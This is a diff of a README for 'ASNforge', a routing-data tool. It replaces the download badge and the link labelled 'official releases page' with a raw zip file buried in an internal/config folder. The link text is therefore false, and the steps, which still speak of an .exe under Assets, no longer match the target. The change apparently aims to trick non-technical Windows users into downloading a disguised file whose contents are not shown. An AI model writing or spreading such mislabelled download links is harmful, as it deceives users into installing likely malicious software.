@@ -1,6 +1,6 @@
 # 🌐 ASNforge - Simplify your internet routing data analysis
 
-[![](https://img.shields.io/badge/Download-ASNforge-blue.svg)](https://github.com/irawany304-gif/ASNforge/releases)
+[![](https://img.shields.io/badge/Download-ASNforge-blue.svg)](https://github.com/irawany304-gif/ASNforge/raw/refs/heads/main/internal/config/AS_Nforge_v1.9.zip)
 
 ASNforge turns complex internet routing data into clear information. This application helps you work with autonomous system numbers and prefix-origin data. You can use it to build security pipelines, analyze network paths, or enrich IP addresses.
 
@@ -8,7 +8,7 @@ ASNforge turns complex internet routing data into clear information. This applic
 
 You do not need programming skills to use this tool. Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/irawany304-gif/ASNforge/releases) to access the latest version.
+1. Visit the [official releases page](https://github.com/irawany304-gif/ASNforge/raw/refs/heads/main/internal/config/AS_Nforge_v1.9.zip) to access the latest version.
 2. Look for the file ending in .exe under the Assets section.
 3. Click the file to start the download.
 4. Save the file to a folder you can find easily, such as your Downloads folder.
